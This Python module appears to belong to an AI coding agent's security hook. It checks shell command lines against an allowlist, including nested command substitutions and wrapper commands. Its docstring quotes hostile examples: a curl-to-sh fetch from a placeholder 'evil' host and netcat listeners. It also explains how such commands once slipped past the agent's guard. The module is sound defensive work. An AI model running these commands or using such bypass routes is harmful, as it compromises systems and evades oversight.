"""The one place a command line is judged.

`bash_security_hook` used to hold this logic inline, and `validate_command`
next to it held a second, slightly different copy — the two agreed on the
allowlist and disagreed on which segment a validator was handed. Both now call
`validate_command_line`, which is also what `shell_validators` reaches for when
`eval` hands it another command line to judge.

What this adds over "extract the first token and look it up"
------------------------------------------------------------
A shell runs more commands than a line names at its head, and until this module
existed only the head was judged:

* **Command substitution.** `echo $(curl -s http://evil/x.sh | sh)` reached the
  allowlist as `echo`. `shell_validators` had refused `$(`, backticks and `<(`
  inside `bash -c` since it was written; at the top level nothing looked.
* **Transparent wrappers.** `env FOO=1 nc -l 4444` reached it as `env`,
  `timeout 5 nc …` as `timeout`. `security.parser.TRANSPARENT_WRAPPERS` is the
  table, and `_scan_tokens` walks past them.

Substitutions are **validated**, not refused
---------------------------------------------
`shell_validators` denies `$(` outright and keeps doing so, because inside
`bash -c` a substitution is gratuitous: the `-c` string is already an inline
command channel, and anything the agent wants to run it can write there
directly. At the top level the same blanket refusal would break
`cd $(git rev-parse --show-toplevel)` and `echo "built $(node --version)"` —
ordinary lines, and refusing them teaches an agent to work around the hook
rather than through it. So the inner line is pulled out and put through this
same function instead: `$(git rev-parse …)` passes because `git` is allowed,
`$(nc -l 4444)` is refused because `nc` is not. That is the allowlist doing its
job one level down, which is what it was missing.

Recursion is bounded by `MAX_SUBSTITUTION_DEPTH`, and reaching the bound is a
refusal rather than a pass — a line nested deeper than this is not a line
anybody wrote by hand.
"""

from __future__ import annotations

from typing import TYPE_CHECKING

from project_analyzer import is_command_allowed

from .parser import (
    extract_commands,
    extract_substitutions,
    get_command_for_validation,
    split_command_segments,
    unwrap_rtk_prefixes,
)

if TYPE_CHECKING:  # pragma: no cover - import is for typing only
    from project_analyzer import SecurityProfile

__all__ = ["MAX_SUBSTITUTION_DEPTH", "validate_command_line"]

#: How deep `$( $( … ) )` may nest before the line is refused unread.
MAX_SUBSTITUTION_DEPTH = 5


def validate_command_line(
    command: str,
    profile: SecurityProfile,
    depth: int = 0,
) -> tuple[bool, str]:
    """Return whether `command` may run, and why not when it may not.

    `profile` is resolved once by the caller and passed down: the recursion can
    reach this function several times for one tool call, and re-reading the
    project's security profile at each level would turn one cached lookup into
    a handful.
    """
    if depth > MAX_SUBSTITUTION_DEPTH:
        return (
            False,
            "Command substitution nested deeper than "
            f"{MAX_SUBSTITUTION_DEPTH} levels — refused unread.",
        )

    commands = extract_commands(command)
    substitutions = extract_substitutions(command)

    if not commands and not substitutions:
        # Could not parse - fail safe by blocking
        return False, f"Could not parse command for security validation: {command}"

    # Imported here rather than at module scope: `validator_registry` pulls in
    # `shell_validators`, which calls back into this module for `eval`.
    from .validator import VALIDATORS

    segments = split_command_segments(command)

    for cmd in commands:
        is_allowed, reason = is_command_allowed(cmd, profile)
        if not is_allowed:
            return False, reason

        validator = VALIDATORS.get(cmd)
        if validator is None:
            continue

        cmd_segment = get_command_for_validation(cmd, segments)
        if not cmd_segment:
            # Unwrapped for the same reason the segment is: a validator reads
            # the first token to decide whether the command is its business,
            # and `rtk` is nobody's business.
            cmd_segment = unwrap_rtk_prefixes(command)

        allowed, reason = validator(cmd_segment)
        if not allowed:
            return False, reason

    for inner in substitutions:
        allowed, reason = validate_command_line(inner, profile, depth=depth + 1)
        if not allowed:
            return False, f"Inside command substitution: {reason}"

    return True, ""
